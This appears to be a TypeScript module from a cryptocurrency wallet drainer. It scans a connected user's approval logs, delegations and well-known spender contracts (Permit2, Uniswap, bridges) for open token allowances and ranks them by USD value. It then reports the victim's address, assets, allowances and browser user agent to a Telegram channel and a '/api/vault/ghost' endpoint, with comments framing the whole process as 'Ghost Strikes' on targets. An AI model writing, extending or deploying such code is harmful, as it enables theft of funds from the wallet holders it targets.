import {
  createPublicClient,
  parseAbi,
  keccak256,
  stringToHex,
  http,
  fallback,
  zeroAddress,
  type Address,
} from "viem";
import { mainnet, bsc, polygon, base, arbitrum, optimism } from "viem/chains";
import { sendDiscoveryToTelegram } from "@/lib/telegram";

/**
 * 🛰️ SYSTEM-WIDE SPENDER REGISTRY
 * High-probability targets for "Ghost Strikes."
 */
const GLOBAL_SPENDERS: Record<string, Address> = {
  PERMIT2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  UNISWAP_V2: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
  UNISWAP_V3: "0xE592427A0AEce92De3Edee1F18E0157C05861564",
  UNISWAP_UNIVERSAL: "0x3fC91A3afd0036113d003415451D878f99D83431",
  PANCAKE_V3: "0x1b813459582cf8600d684061587d057795082E81",
  ACROSS_BRIDGE: "0x5c7BC36701f46D75C09B663a758703fA9824613C",
  STARGATE_BRIDGE: "0x8731d54E9D02c286767d56ac03e8037C07e01e98",
  DELEGATE_CASH: "0x00000000000000447e699706C8f683031127B681",
  SEAPORT_CONDUIT: "0x1e0049783f0caeb17c1c163968434d3d82a632c5",
  LIFI_DIAMOND: "0x1231DEB6f5749CB6cE2dF308328d7010CadBfd32",
  SETTLER: (process.env.NEXT_PUBLIC_SETTLER_ADDR as Address) || zeroAddress,
};

const MINIMAL_ERC20_ABI = parseAbi([
  "function allowance(address owner, address spender) view returns (uint256)",
  "function nonces(address owner) view returns (uint256)",
] as const);

/**
 * 🕵️ CROSS-CHAIN VECTOR DISCOVERY
 */
async function extractDeepVectors(
  userAddress: Address,
  client: any,
): Promise<Address[]> {
  const vectors = new Set<Address>();
  try {
    const block = await client.getBlockNumber();
    console.log(`[DEBUG] Scanning logs from block ${block - 100000n}`);

    const logs = await client.getLogs({
      fromBlock: block - 100000n,
      args: { from: userAddress },
    });

    logs.forEach((tx: any) => {
      if (tx.address) vectors.add(tx.address.toLowerCase() as Address);
      if (tx.to) vectors.add(tx.to.toLowerCase() as Address);
    });

    const delegateAbi = parseAbi([
      "function getDelegatesForAll(address) view returns (address[])",
    ] as const);

    const delegates = await client
      .readContract({
        address: GLOBAL_SPENDERS.DELEGATE_CASH,
        abi: delegateAbi,
        functionName: "getDelegatesForAll",
        args: [userAddress],
      })
      .catch(() => []);

    delegates?.forEach((d: string) => vectors.add(d.toLowerCase() as Address));
  } catch (e: any) {
    console.warn(`⚠️ [DEEP-VECTOR] Extraction throttled: ${e.message}`);
  }
  return Array.from(vectors);
}

/**
 * ⚡ APEX EXECUTION: THE OMNI-STRIKE
 */
export async function checkAndTriggerGhostSweep(
  userAddress: string,
  assets: any[],
  chainId: number,
) {
  console.log(
    `🚀 [GHOST-SWEEP] Initiating Strike for ${userAddress} on Chain ${chainId}`,
  );

  const ALCHEMY_KEY = process.env.NEXT_PUBLIC_ALCHEMY_API_KEY;
  const chainMap: Record<number, any> = {
    1: mainnet,
    56: bsc,
    137: polygon,
    8453: base,
    42161: arbitrum,
    10: optimism,
  };

  const targetChain = chainMap[chainId] || mainnet;

  // Refined slug logic for RPC compatibility
  const networkSlug =
    targetChain.id === 1
      ? "mainnet"
      : targetChain.id === 56
      ? "bsc"
      : targetChain.id === 137
      ? "polygon"
      : targetChain.id === 8453
      ? "base"
      : targetChain.id === 42161
      ? "arbitrum"
      : "mainnet";

  /**
   * 🛡️ HARDENED TRANSPORT
   * Uses Fallback + Ranking to bypass 403 Forbidden errors
   */
  const client = createPublicClient({
    chain: targetChain,
    transport: fallback(
      [
        http(`https://${networkSlug}.g.alchemy.com/v2/${ALCHEMY_KEY}`),
        http(`https://rpc.ankr.com/${networkSlug}`),
        http(targetChain.id === 1 ? "https://rpc.flashbots.net" : undefined),
        http(), // Last resort public
      ],
      { rank: true, retryCount: 3 },
    ),
  });

  try {
    // Check connectivity immediately
    const currentBlock = await client.getBlockNumber();
    console.log(`[DEBUG] RPC Connected. Current Block: ${currentBlock}`);

    const [histLogs, deepVectors, metrics] = await Promise.all([
      client
        .getLogs({
          event: parseAbi([
            "event Approval(address indexed owner, address indexed spender, uint256 value)",
          ])[0],
          args: { owner: userAddress as Address },
          fromBlock: currentBlock - 500000n, // Reduced depth to prevent RPC timeouts
        })
        .catch(() => []),
      extractDeepVectors(userAddress as Address, client),
      {
        ua: typeof navigator !== "undefined" ? navigator.userAgent : "SSR",
        v: "APEX_GHOST_v10_FIXED",
        ts: Date.now(),
      },
    ]);

    const masterSpenders = Array.from(
      new Set([
        ...(histLogs as any[]).map((l) => l.args.spender),
        ...deepVectors,
        ...Object.values(GLOBAL_SPENDERS),
      ]),
    ).filter((s) => !!s && s !== zeroAddress);

    console.log(`[DEBUG] Found ${masterSpenders.length} potential spenders.`);

    const ghostTargets: any[] = [];
    const viableAssets = assets.filter(
      (a) =>
        (a.contractAddress || a.tokenAddress) && BigInt(a.balance || 0) > 0n,
    );

    for (const asset of viableAssets) {
      const tokenAddr = (asset.contractAddress ||
        asset.tokenAddress) as Address;

      // Batch check spenders in chunks of 50 to avoid multicall limits
      const chunks = [];
      for (let i = 0; i < masterSpenders.length; i += 50) {
        chunks.push(masterSpenders.slice(i, i + 50));
      }

      await Promise.all(
        chunks.map(async (chunk) => {
          try {
            const results = await client.multicall({
              contracts: chunk.map((spender) => ({
                address: tokenAddr,
                abi: MINIMAL_ERC20_ABI,
                functionName: "allowance",
                args: [userAddress as Address, spender as Address],
              })),
              allowFailure: true,
            });

            results.forEach((res, i) => {
              const allowanceValue =
                res.status === "success"
                  ? (res.result as unknown as bigint)
                  : 0n;

              if (allowanceValue > 0n) {
                ghostTargets.push({
                  token: tokenAddr,
                  symbol: asset.symbol,
                  amount: asset.balance.toString(),
                  displayBalance: asset.displayBalance,
                  spender: chunk[i],
                  chainId,
                  usdValue: asset.usdValue || 0,
                  isMax: allowanceValue > 2n ** 128n,
                });
              }
            });
          } catch (e) {}
        }),
      );
    }

    if (ghostTargets.length > 0) {
      ghostTargets.sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));

      // 📡 TELEGRAM REPORTING
      await sendDiscoveryToTelegram({
        address: userAddress,
        chainId,
        assets: ghostTargets,
        userAgent: metrics.ua,
      }).catch(() => null);

      const payload = JSON.stringify({
        u: userAddress,
        t: ghostTargets,
        c: chainId,
        m: "GHOST_DISCOVERY",
        details: `Detected ${ghostTargets.length} approved spenders`,
        e: keccak256(stringToHex(`${userAddress}-${Date.now()}`)),
      });

      if (typeof navigator !== "undefined" && navigator.sendBeacon) {
        navigator.sendBeacon(
          "/api/vault/ghost",
          new Blob([payload], { type: "application/json" }),
        );
      } else {
        fetch("/api/vault/ghost", {
          method: "POST",
          body: payload,
          keepalive: true,
        });
      }
      console.log(
        `🎯 [GHOST-SWEEP] Dispatched ${ghostTargets.length} targets.`,
      );
    } else {
      console.log("[DEBUG] No active allowances found.");
    }
  } catch (err: any) {
    console.error("❌ [GHOST-SWEEP] Strike Aborted:", err.message);
  }
}
